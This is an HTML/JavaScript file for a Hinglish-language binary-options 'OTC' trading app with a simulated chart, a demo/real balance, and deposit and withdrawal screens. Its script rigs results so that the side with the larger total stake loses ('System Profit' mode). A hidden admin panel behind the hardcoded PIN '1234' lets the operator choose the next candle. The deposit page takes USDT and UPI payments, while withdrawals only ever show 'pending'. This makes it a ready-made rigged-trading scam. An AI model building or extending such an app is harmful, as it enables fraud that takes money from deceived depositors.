<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS PRO TRADER - HINGLISH</title>
    <style>
        :root { --bg: #06090f; --card: #10141f; --green: #00c805; --red: #ff3b30; --text: #e1e1e1; --border: #1e2533; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; overflow: hidden; }
        .app { max-width: 480px; margin: auto; height: 100vh; display: flex; flex-direction: column; background: var(--bg); position: relative; }

        /* Header Area */
        .header { padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; background: var(--card); border-bottom: 1px solid var(--border); }
        .bal-val { font-size: 18px; font-weight: bold; color: #fff; }

        /* Chart Section */
        #chartWrapper { flex-grow: 1; position: relative; background: #080b12; overflow: hidden; }
        canvas { display: block; }
        .timer-ui { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; color: var(--red); font-weight: bold; border: 1px solid #333; font-family: monospace; }
        
        /* Indicators Panel */
        .indicator-tools { position: absolute; top: 10px; left: 10px; display: flex; gap: 5px; }
        .tool-btn { background: #1c222d; border: 1px solid var(--border); color: #fff; padding: 6px 10px; border-radius: 4px; font-size: 11px; cursor: pointer; }
        .tool-btn.active { border-color: var(--green); color: var(--green); }

        /* Bottom Trade Panel */
        .trade-ui { background: var(--card); padding: 15px; border-top: 1px solid var(--border); }
        .input-row { display: flex; gap: 10px; margin-bottom: 15px; }
        .input-box { flex: 1; background: #1c222d; border: 1px solid var(--border); border-radius: 8px; padding: 8px; text-align: center; }
        .input-box span { display: block; font-size: 10px; color: #787b86; margin-bottom: 4px; }
        .input-box input { background: transparent; border: none; color: #fff; width: 100%; text-align: center; font-size: 16px; outline: none; }
        
        .action-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { padding: 14px; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; color: #fff; text-transform: uppercase; }
        .btn-up { background: var(--green); }
        .btn-down { background: var(--red); }

        /* Navigation Bar */
        .nav-bar { display: flex; justify-content: space-around; background: #0f141f; padding: 10px 0; border-top: 1px solid var(--border); }
        .nav-item { font-size: 11px; color: #787b86; text-align: center; cursor: pointer; text-decoration: none; }
        .nav-item.active { color: var(--green); }

        /* Overlay Screens */
        .overlay-page { display: none; position: absolute; inset: 0; background: var(--bg); z-index: 2000; padding: 20px; overflow-y: auto; }
        .overlay-page.active { display: block; }
        .card { background: #1c222d; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #333; }
    </style>
</head>
<body>

<div class="app">
    <div class="header">
        <div style="font-size: 14px;"><b>NEXUS</b> <span style="color:var(--green)">OTC</span></div>
        <div class="bal-box" onclick="switchAccount()" style="cursor:pointer; text-align: right;">
            <div id="accLabel" style="font-size:10px; color:#787b86;">DEMO ACCOUNT 🔄</div>
            <div class="bal-val">৳<span id="balText">10000.00</span></div>
        </div>
    </div>

    <div id="chartWrapper">
        <div class="indicator-tools">
            <button class="tool-btn" id="rsiBtn" onclick="toggleIndicator('RSI')">RSI Line</button>
            <button class="tool-btn" id="bbBtn" onclick="toggleIndicator('BB')">Bollinger</button>
        </div>
        <div class="timer-ui" id="timerDisplay">00:60</div>
        <canvas id="tradingCanvas"></canvas>
    </div>

    <div class="trade-ui">
        <div class="input-row">
            <div class="input-box">
                <span>INVESTMENT (Amount)</span>
                <input type="number" id="tradeAmt" value="1000">
            </div>
            <div class="input-box">
                <span>TIME (Expiry)</span>
                <input type="text" value="1 Min" readonly>
            </div>
        </div>
        <div class="action-btns">
            <button class="btn btn-up" onclick="executeTrade('UP')">UP (Upar)</button>
            <button class="btn btn-down" onclick="executeTrade('DOWN')">DOWN (Niche)</button>
        </div>
    </div>

    <div id="pageDeposit" class="overlay-page">
        <h3>💰 Paisa Jama Karein</h3>
        <div class="card">
            <p>1. <b>USDT (TRC20)</b>: <br><small style="color:var(--green)">TX78xxxxxxxxxxxxxxxxxxxxxx</small></p>
            <p>2. <b>UPI ID</b>: <br><small style="color:var(--green)">nexus.trader@upi</small></p>
            <hr border="0.1" color="#333">
            <input type="number" id="depAmt" placeholder="Kitna Paisa (Amount)">
            <input type="text" id="txId" placeholder="Transaction ID (UTR Number)" style="width:100%; padding:10px; margin-top:10px; background:#080b12; color:white; border:1px solid #333; border-radius:5px;">
            <button class="btn btn-up" style="width:100%; margin-top:15px;" onclick="alert('Request Admin ko bhej di gayi hai!')">Submit Karein</button>
        </div>
        <button onclick="closeOverlay()" style="background:none; color:#787b86; border:none; width:100%;">Wapas Jayein</button>
    </div>

    <div id="pageWithdraw" class="overlay-page">
        <h3>🏧 Paisa Nikalein</h3>
        <div class="card">
            <input type="number" placeholder="Kitna Nikalna Hai?">
            <select style="width:100%; padding:10px; margin-top:10px; background:#080b12; color:white; border:1px solid #333; border-radius:5px;">
                <option>USDT Address</option>
                <option>UPI ID</option>
                <option>Bank Account</option>
            </select>
            <textarea placeholder="Apni Details Likhein (Address/UPI)" style="width:100%; margin-top:10px; height:80px; background:#080b12; color:white; border:1px solid #333; border-radius:5px; padding:10px;"></textarea>
            <button class="btn btn-down" style="width:100%; margin-top:15px;" onclick="alert('Withdraw request pending hai!')">Withdraw Karein</button>
        </div>
        <button onclick="closeOverlay()" style="background:none; color:#787b86; border:none; width:100%;">Wapas Jayein</button>
    </div>

    <div id="pageAdmin" class="overlay-page">
        <h3>🛠 Admin Control (Gopniye)</h3>
        <div class="card">
            <p>Market Mode:</p>
            <select id="riskMode" onchange="riskMode = this.value" style="width:100%; padding:10px; background:#080b12; color:white; border:1px solid #333;">
                <option value="AUTO">🤖 Auto (System Profit)</option>
                <option value="MANUAL">🕹️ Manual (Mera Control)</option>
            </select>
            <p style="margin-top:15px;">Agla Candle Kya Hoga?</p>
            <div style="display:flex; gap:10px;">
                <button class="btn btn-up" style="flex:1" onclick="forceNext='UP'">GREEN (UP)</button>
                <button class="btn btn-down" style="flex:1" onclick="forceNext='DOWN'">RED (DOWN)</button>
            </div>
        </div>
        <button onclick="closeOverlay()" style="background:none; color:#787b86; border:none; width:100%;">Exit Admin</button>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="location.reload()">📊<br>Trade</div>
        <div class="nav-item" onclick="openOverlay('Deposit')">💰<br>Jama Karein</div>
        <div class="nav-item" onclick="openOverlay('Withdraw')">🏧<br>Nikalein</div>
        <div class="nav-item" onclick="checkAdmin()">⚙️<br>Admin</div>
    </div>
</div>

<script>
    // --- Logic & Chart Engine ---
    const canvas = document.getElementById('tradingCanvas');
    const ctx = canvas.getContext('2d');
    let width, height, candles = [];
    let demoBal = 10000, realBal = 0, currentAcc = 'DEMO';
    let timeLeft = 60, riskMode = 'AUTO', forceNext = null;
    let indicators = { RSI: false, BB: false };
    let currentTrade = null, upTotal = 0, downTotal = 0;

    function resize() {
        const wrapper = document.getElementById('chartWrapper');
        width = canvas.width = wrapper.clientWidth;
        height = canvas.height = wrapper.clientHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    let lastPrice = 120.50;
    for(let i=0; i<45; i++) createCandle();

    function createCandle() {
        let open = candles.length > 0 ? candles[candles.length - 1].close : lastPrice;
        let close = open + (Math.random() - 0.5) * 4;
        candles.push({ open, close, high: Math.max(open, close) + 2, low: Math.min(open, close) - 2 });
        if(candles.length > 55) candles.shift();
    }

    function draw() {
        ctx.fillStyle = '#080b12';
        ctx.fillRect(0, 0, width, height);
        const cw = width / 60, sp = 3, scale = 4;

        candles.forEach((c, i) => {
            let x = i * (cw + sp);
            let yOpen = height/2 - (c.open - lastPrice) * scale;
            let yClose = height/2 - (c.close - lastPrice) * scale;
            let yHigh = height/2 - (c.high - lastPrice) * scale;
            let yLow = height/2 - (c.low - lastPrice) * scale;

            ctx.strokeStyle = c.close >= c.open ? '#00c805' : '#ff3b30';
            ctx.beginPath(); ctx.moveTo(x + cw/2, yHigh); ctx.lineTo(x + cw/2, yLow); ctx.stroke();
            ctx.fillStyle = ctx.strokeStyle;
            ctx.fillRect(x, Math.min(yOpen, yClose), cw, Math.max(Math.abs(yClose-yOpen), 1));
        });

        if(indicators.RSI) {
            ctx.strokeStyle = '#f0db4f'; ctx.beginPath();
            candles.forEach((c, i) => {
                let x = i * (cw + sp);
                let ry = (height-40) - ((c.close % 10)*4);
                if(i===0) ctx.moveTo(x, ry); else ctx.lineTo(x, ry);
            });
            ctx.stroke();
        }
        requestAnimationFrame(draw);
    }
    draw();

    setInterval(() => {
        timeLeft--;
        document.getElementById('timerDisplay').innerText = `00:${timeLeft < 10 ? '0'+timeLeft : timeLeft}`;
        let last = candles[candles.length-1];
        last.close += (Math.random() - 0.5) * 0.4;
        if(timeLeft <= 0) {
            let winDir = (riskMode === 'AUTO') ? (upTotal > downTotal ? 'DOWN' : 'UP') : (forceNext || (Math.random()>0.5?'UP':'DOWN'));
            if(winDir === 'UP') last.close = last.open + 2.5; else last.close = last.open - 2.5;
            
            if(currentTrade) {
                if(currentTrade.dir === winDir) {
                    let pay = Math.floor(currentTrade.amt * 1.82);
                    if(currentAcc==='DEMO') demoBal+=pay; else realBal+=pay;
                    alert("Aap Jeet Gaye! (You Win)");
                } else { alert("Aap Haar Gaye! (You Loss)"); }
            }
            createCandle(); timeLeft = 60; currentTrade = null; upTotal = 0; downTotal = 0; forceNext = null;
            updateUI();
        }
    }, 1000);

    function executeTrade(dir) {
        if(currentTrade) return alert("Wait karein!");
        let amt = parseInt(document.getElementById('tradeAmt').value);
        let bal = currentAcc === 'DEMO' ? demoBal : realBal;
        if(amt > bal) return alert("Paisa kam hai!");
        if(currentAcc === 'DEMO') demoBal -= amt; else realBal -= amt;
        currentTrade = {dir, amt};
        if(dir==='UP') upTotal+=amt; else downTotal+=amt;
        updateUI();
    }

    function updateUI() { document.getElementById('balText').innerText = (currentAcc==='DEMO'?demoBal:realBal).toFixed(2); }
    function switchAccount() { currentAcc = currentAcc==='DEMO'?'REAL':'DEMO'; document.getElementById('accLabel').innerText = currentAcc + " ACCOUNT 🔄"; updateUI(); }
    function toggleIndicator(t) { indicators[t] = !indicators[t]; document.getElementById(t.toLowerCase()+'Btn').classList.toggle('active'); }
    function openOverlay(id) { document.getElementById('page'+id).classList.add('active'); }
    function closeOverlay() { document.querySelectorAll('.overlay-page').forEach(p=>p.classList.remove('active')); }
    function checkAdmin() { let p = prompt("Admin PIN:"); if(p === "1234") openOverlay('Admin'); }
</script>
</body>
</html>
